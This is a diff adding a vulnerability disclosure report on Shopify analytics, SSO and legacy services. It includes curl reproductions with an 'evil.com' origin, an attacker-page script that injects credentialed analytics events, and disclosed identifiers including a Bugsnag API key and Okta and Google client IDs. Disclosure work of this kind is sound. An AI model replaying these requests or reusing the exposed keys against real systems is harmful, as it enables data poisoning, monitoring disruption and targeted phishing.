@@ -1,0 +1,225 @@
+Title: CORS Misconfiguration with Credentials on Shopify Analytics Services + Internal SSO Information Disclosure
+
+Asset: monorail-edge.shopifysvc.com, error-analytics-sessions-production.shopifysvc.com, otlp-http-production.shopifysvc.com, minerva.shopifycloud.com
+
+Severity: Medium (CORS) / Low (Info Disclosure)
+
+============================================================================
+FINDING 1: CORS Reflects Arbitrary Origin with access-control-allow-credentials: true
+============================================================================
+
+Summary:
+Multiple Shopify internal analytics and telemetry services reflect arbitrary Origin headers
+in the access-control-allow-origin response while simultaneously setting
+access-control-allow-credentials: true. Per the CORS specification, this combination allows
+any website to make credentialed cross-origin requests and READ the responses, enabling
+potential cross-origin data exfiltration if any endpoint returns user-specific data.
+
+Affected Services:
+  1. monorail-edge.shopifysvc.com (Shopify analytics event pipeline)
+  2. error-analytics-sessions-production.shopifysvc.com (Error analytics sessions)
+  3. otlp-http-production.shopifysvc.com (OpenTelemetry collector)
+
+Steps to Reproduce:
+
+  1. CORS reflection test on monorail-edge:
+     $ curl -sI -X POST "https://monorail-edge.shopifysvc.com/v1/produce" \
+       -H "Origin: https://evil.com" \
+       -H "Content-Type: application/json" \
+       -d '{}'
+
+     Response headers include:
+       access-control-allow-origin: https://evil.com
+       access-control-allow-credentials: true
+       access-control-allow-methods: OPTIONS,POST
+       access-control-allow-headers: User-Agent,Accept,Content-Type,...
+       access-control-expose-headers: User-Agent,Accept,Content-Type,...
+
+  2. CORS reflection test on error-analytics-sessions:
+     $ curl -sI -X POST "https://error-analytics-sessions-production.shopifysvc.com/" \
+       -H "Origin: https://evil.com" \
+       -H "Content-Type: application/json" \
+       -d '{}'
+
+     Response:
+       HTTP/2 202
+       access-control-allow-origin: https://evil.com
+       access-control-allow-credentials: true
+
+  3. CORS reflection test on otlp-http:
+     $ curl -sI -X POST "https://otlp-http-production.shopifysvc.com/v1/traces" \
+       -H "Origin: https://evil.com" \
+       -H "Content-Type: application/json" \
+       -d '{}'
+
+     Response:
+       HTTP/2 200
+       access-control-allow-credentials: true
+       access-control-allow-origin: https://evil.com
+
+  4. Preflight (OPTIONS) also reflects:
+     $ curl -sI -X OPTIONS "https://monorail-edge.shopifysvc.com/v1/produce" \
+       -H "Origin: https://evil.com" \
+       -H "Access-Control-Request-Method: POST"
+
+     Response:
+       HTTP/2 200
+       access-control-allow-origin: https://evil.com
+       access-control-allow-credentials: true
+
+Impact:
+- Violates CORS specification: reflecting arbitrary origins with credentials should never
+  be combined (the spec requires explicitly listing origins, not reflecting them)
+- Any website can make credentialed cross-origin POST requests to these services and read
+  the full response body via JavaScript
+- Enables cross-origin analytics event injection with the victim's session context
+- Could be leveraged for analytics data poisoning in the context of an authenticated
+  Shopify merchant who visits an attacker-controlled page
+- If any future endpoint on these services returns user-specific data in responses,
+  this becomes a direct data exfiltration vector
+- The monorail-edge service is referenced in CSPs across Shopify's infrastructure
+  (checkout.shopifycs.com, shop.myshopify.com, etc.)
+
+Current Attack Scenario:
+  <script>
+  // From attacker's website, while victim (Shopify merchant) visits
+  fetch('https://monorail-edge.shopifysvc.com/v1/produce', {
+    method: 'POST',
+    credentials: 'include',
+    headers: {'Content-Type': 'application/json',
+              'X-Monorail-Edge-Event-Created-At-Ms': Date.now().toString(),
+              'X-Monorail-Edge-Event-Sent-At-Ms': Date.now().toString()},
+    body: JSON.stringify({
+      schema_id: 'trekkie_storefront_page_view/7.0',
+      payload: {shopId: 'TARGET_SHOP_ID', pageType: 'checkout'}
+    })
+  }).then(r => r.text()).then(console.log);
+  </script>
+
+Recommendation:
+- Replace the origin-reflecting logic with an explicit allowlist of Shopify domains
+- If wildcard CORS is needed for these analytics ingestion services, remove
+  access-control-allow-credentials: true (use access-control-allow-origin: * without
+  credentials, which the spec allows safely)
+
+============================================================================
+FINDING 2: Minerva Internal SSO - Full OpenID Configuration and JWKS Keys Exposed
+============================================================================
+
+Summary:
+Shopify's internal employee SSO system (Minerva) at minerva.shopifycloud.com exposes
+full OpenID Connect configuration, JWKS signing keys, and reveals it authenticates
+through shopify.okta.com with a specific Okta client ID. This provides attackers with
+detailed knowledge of the internal authentication architecture.
+
+Steps to Reproduce:
+
+  1. OpenID Configuration:
+     $ curl -s "https://minerva.shopifycloud.com/.well-known/openid-configuration"
+
+     Reveals:
+     - issuer: https://minerva.shopifycloud.com
+     - authorization_endpoint: https://minerva.shopifycloud.com/oauth/authorize
+     - token_endpoint: https://minerva.shopifycloud.com/oauth/token
+     - introspection_endpoint: https://minerva.shopifycloud.com/oauth/introspect
+     - userinfo_endpoint: https://minerva.shopifycloud.com/oauth/userinfo
+     - jwks_uri: https://minerva.shopifycloud.com/oauth/discovery/keys
+     - Supports implicit flow: response_types_supported includes "token", "id_token"
+     - Supports plain PKCE: code_challenge_methods_supported includes "plain"
+     - Claims include employee-specific fields: "employee_id", "username", "device_context"
+     - Grant types: authorization_code, implicit_oidc
+
+  2. JWKS Keys (4 RSA keys exposed):
+     $ curl -s "https://minerva.shopifycloud.com/oauth/discovery/keys"
+
+     Returns 4 RSA public keys with kid values:
+     - 33d243afcd95c768f49933dbe3fd05c7eb367c5da5342198e2064b1beb199773
+     - 49293b9a1c509bb1ca82de39900fb5900b895d369ea75f8fd028ff854a404ef4
+     - gklSGscZVMP0cageWnUweBTG2sM2zoSkekqAQ2FfRdA
+     - y5Q8CwdGZWCcbyQHXS6ajxPW7sCwHxuL-n-aJu5KVoE
+
+  3. Okta Client ID Disclosure:
+     $ curl -sI "https://minerva.shopifycloud.com/oauth/authorize?client_id=test&response_type=code"
+
+     Redirects to:
+     https://shopify.okta.com/oauth2/v1/authorize?client_id=0oalkvlxz1CcOw9LO0x7&...
+
+     This reveals:
+     - Shopify uses Okta for employee authentication
+     - Okta client ID: 0oalkvlxz1CcOw9LO0x7
+     - Callback URL: https://minerva.shopifycloud.com/auth/okta/callback
+
+Security Concerns:
+- Implicit flow support ("token", "id_token" response types) passes tokens in URL
+  fragments, which are logged by browser history, referrer headers, and proxy servers
+- "plain" PKCE code challenge support provides no protection (attacker who intercepts
+  the code verifier can compute the challenge trivially)
+- Employee-specific claims (employee_id, username) in ID tokens could aid targeted attacks
+- Full architecture knowledge enables focused phishing campaigns against Shopify employees
+- The Okta client ID could potentially be used for OAuth abuse or social engineering
+
+Recommendation:
+- Disable implicit flow (response_types: token, id_token) - use authorization code only
+- Remove "plain" from code_challenge_methods_supported - require S256 only
+- Consider restricting access to .well-known/openid-configuration to internal networks
+- Rotate the Okta client ID if possible
+
+============================================================================
+FINDING 3: Bugsnag API Key Exposure on apps.shopify.com
+============================================================================
+
+The apps.shopify.com (Shopify App Store) exposes a Bugsnag API key in the page source:
+
+  window.bugsnagApiKey = "e6295e2834074504b103aaaf32d1afcd";
+
+Source: View source of https://apps.shopify.com/ (any page)
+
+This allows:
+- Injecting fake error reports into Shopify's error monitoring
+- Potentially viewing error data (depending on Bugsnag project permissions)
+- Disrupting error monitoring by flooding with fake events
+
+============================================================================
+FINDING 4: Legacy Dovetale Infrastructure Active with Session Cookies
+============================================================================
+
+Shopify acquired Dovetale and merged it into Shopify Collabs, but the legacy
+infrastructure remains active:
+
+  - admin.dovetale.com -> redirects to admin.collabs.shopify.com -> api.collabs.shopify.com/admin
+  - api.dovetale.com -> returns 404 (5201 bytes - full HTML error page)
+  - api.collabs.shopify.com/ping -> returns 204 with:
+    - CSRF token in X-CSRF-Token header
+    - Session cookie: _dovetale_session (still uses legacy name)
+  - api.collabs.shopify.com/api/w9/{creators,brands,applications,products} -> return 401
+
+The continued use of "_dovetale_session" as the cookie name and the Dovetale error page
+on api.dovetale.com suggests incomplete migration that could contain legacy vulnerabilities.
+
+============================================================================
+FINDING 5: Internal Dashboard CORS Allowlisting on community.shopify.com
+============================================================================
+
+community.shopify.com (Discourse) returns CORS headers allowing:
+  access-control-allow-origin: https://ama-dashboard.quick.shopify.io
+  access-control-allow-credentials: true
+
+The ama-dashboard.quick.shopify.io is an internal Shopify tool behind Google IAP
+(Identity-Aware Proxy) with Google OAuth client ID:
+  503582027637-7jii1kpbn7d6780kn4p4snv3qijine6v.apps.googleusercontent.com
+
+While the CORS is properly hardcoded (doesn't reflect arbitrary origins), the exposure
+of the internal dashboard domain and Google IAP client ID is an information disclosure.
+
+============================================================================
+ENVIRONMENT / NOTES
+============================================================================
+
+- All testing performed server-side (curl only) - no browser-based testing possible
+- Shopify uses Cloudflare with JS challenge on admin/auth pages (blocks server testing)
+- Shopify's primary attack surface is extremely well-hardened with multiple layers
+- CDN (cdn.shopify.com) properly uses sandbox CSP
+- Storefront API properly restricts admin-level queries (customers, orders not accessible)
+- accounts.shopify.com OpenID configuration is well-documented but includes interesting
+  scopes: "employee", "legacy", "device"
+- Tested: July 27, 2026
